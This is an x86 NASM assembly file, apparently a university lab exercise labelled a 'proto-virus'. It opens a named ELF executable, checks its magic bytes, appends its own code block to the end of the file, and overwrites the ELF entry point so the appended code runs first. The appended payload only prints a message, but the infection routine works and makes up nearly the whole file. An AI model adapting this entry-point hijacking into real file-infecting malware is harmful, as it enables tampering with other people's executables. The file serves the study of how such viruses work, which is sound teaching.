%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28


	
	global _start

	elf_string db 0x7f,'ELF'

	section .bss
    file_buffer: resb 4 
	fd: resb 4
	end_file_off: resb 4
	start_elf_add: resb 4
	ph_v_add: resb 4
	vir_loc: resb 4

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;CODE START
	open FileName, RDWR, 0777  
	cmp eax, 0		;check if open succeed
	jl error
	mov [fd], eax
	read eax, file_buffer, 4
	cmp eax, -1		;check if read succeed
	jl error
	mov esi, [file_buffer]	;make the compare to check if it's ELF file or not
	mov edi, [elf_string]
	cmp dword esi, edi
	jnz error

	;finding the virus location in the infected file
	lseek [fd], 0, SEEK_END		;get the file size
	mov [end_file_off], eax

	lseek [fd], 60, SEEK_SET	;52+8 = 60, move to the virtual address field in p_header
	read [fd], ph_v_add, 4

	mov ecx, [ph_v_add]				
	add ecx, [end_file_off]
	mov [vir_loc], ecx
	
	lseek [fd], 0, SEEK_END		;inserting the virus to the ELF file
	write [fd], code_start, code_end - code_start

	;change entry point to the virus code
	lseek [fd], ENTRY, SEEK_SET
	write [fd], vir_loc, 4
	close [fd]
	jmp VirusExit



	

	
	

	;close [fd]
	;open FileName, 0x401, 0777
	;cmp eax, 0
	;jl error
	;mov [fd], eax
	;write [fd], code_start, code_end - code_start
	exit 0
	



error: 
	write 1, Failstr, 12
	jmp VirusExit

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec2short", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0

	

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:

call get_my_loc
sub ecx, next_i - code_start ; We have in ecx the address of code_start

code_start:
OutStr2:	db "The lab 9 proto-virus strikes!", 10, 0
	mov	edx, 31
	mov	ecx, OutStr2
	mov	ebx, 1
	mov	eax, 4
	int	0x80
code_end: